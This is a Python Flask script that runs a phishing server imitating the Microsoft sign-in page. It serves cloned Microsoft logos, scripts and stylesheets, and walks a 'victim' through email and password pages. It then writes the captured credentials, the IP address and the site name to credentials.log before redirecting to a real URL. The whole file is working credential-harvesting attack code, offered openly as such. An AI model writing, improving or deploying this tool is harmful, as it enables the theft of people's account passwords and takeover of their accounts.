from flask import Flask, request, render_template, send_file, redirect
from threading import Thread
from colorama import Fore
from sys import argv
import sys
import colorama
import logging
import os

#### Variables
redirect_url = argv[1]
host = argv[2]
port = int(argv[3])
sitename = argv[4]
display_reqs = argv[5]

#### Config
app = Flask(__name__)
logging.getLogger('werkzeug').disabled = True if display_reqs != "y" else None
sys.modules['flask.cli'].show_server_banner = lambda *x: None
colorama.init(autoreset=True)


print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to to to the link...")
## Ip logging warning:
# This shouldn't be used for ratelimiting or actual tracking via ip addresses
# these request headers can easily be spoofed and but is a simple way to get addresses behind a proxy

@app.route("/")
def email():
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found: " + Fore.CYAN + request.headers.get('X-Forwarded-For'))
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
    print("\n\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to enter credentials...")
    return render_template("email.html")


@app.route("/", methods=["POST"])
def passwd():
    print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim entered email... Waiting for password...")
    return render_template("password.html", email=request.form.to_dict(flat=False)["loginfmt"][0])


@app.route("/login.php", methods=["POST"])
def getcreds():
    creds = request.form.to_dict(flat=False)
    with open("credentials.log" , "a") as file:
        print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Victim entered credentials!")
        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Email: " + Fore.CYAN + f"{list(creds.keys())[0]}", "\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + f"{creds[list(creds.keys())[0]][0]}")
        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
        file.write(f"{list(creds.keys())[0]} : {creds[list(creds.keys())[0]][0]} : {request.headers.get('X-Forwarded-For')} : {sitename}\n")
        return redirect(redirect_url)



@app.route("/sprites/microsoft_logo.svg")
def Logo1():
    return send_file(os.path.join("templates", "sprites", "microsoft_logo.svg"))


@app.route("/sprites/icon_key.svg")
def Logo2():
    return send_file(os.path.join("templates", "sprites", "icon_key.svg"))


@app.route("/index_files/ConvergedLoginPaginatedStrings.EN.js")
def JS_1():
    return send_file(os.path.join("templates", "index_files", "ConvergedLoginPaginatedStrings.EN.js"))


@app.route("/index_files/Converged_v21033.css")
def CSS():
    return send_file(os.path.join("templates", "index_files", "Converged_v21033.css"))


@app.route("/index_files/ConvergedLogin_PCore.js")
def JS_2():
    return send_file(os.path.join("templates", "index_files", "ConvergedLogin_PCore.js"))


@app.route("/sprites/ellipsis_white.svg")
def Logo3():
    return send_file(os.path.join("templates", "sprites", "ellipsis_white.svg"))


@app.route("/sprites/ellipsis_grey.svg")
def Logo4():
    return send_file(os.path.join("templates", "sprites", "ellipsis_grey.svg"))


app.run(host=host, port=port)
